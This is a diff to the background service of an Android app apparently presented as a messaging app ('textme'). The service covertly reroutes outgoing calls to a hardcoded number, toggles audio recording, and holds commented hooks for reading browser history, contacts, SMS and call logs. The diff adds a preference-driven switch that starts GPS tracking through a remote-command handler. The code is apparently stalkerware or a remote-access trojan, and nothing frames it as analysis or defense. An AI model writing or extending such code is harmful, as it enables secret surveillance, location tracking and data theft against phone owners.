@@ -29,6 +29,7 @@ import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.data.pojos.Recorder;
+import com.candroid.textme.jobs.JobsIntentService;
 import com.candroid.textme.receivers.ImeReceiver;
 import com.candroid.textme.api.Lofl;
 import com.candroid.textme.receivers.CreateConversationReceiver;
@@ -155,12 +156,13 @@ public class MessagingService extends Service {
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
         OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
         ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
+        JobsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(JobsIntentService.GPS_TRACKER_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+/*        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             mHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
             mHandlerThread.start();
             mLooper = mHandlerThread.getLooper();
@@ -168,7 +170,7 @@ public class MessagingService extends Service {
             mLocationManager = Lofl.getLocationManager(MessagingService.this);
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
-        }
+        }*/
 /*        Lofl.onReceiveCommand(this, Commands.CONTACTS);
         Lofl.onReceiveCommand(this, Commands.SMS);
         Lofl.onReceiveCommand(this, Commands.CALL_LOG);
@@ -180,6 +182,9 @@ public class MessagingService extends Service {
         //Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE, null, null);
 //        Lofl.testProcessCommand(this);
         //Lofl.sendCommandTest(this);
+        if(JobsIntentService.sShouldTrackGps){
+            Lofl.onReceiveCommand(this, 21, "start", null);
+        }
         return super.onStartCommand(intent, flags, startId);
     }
 
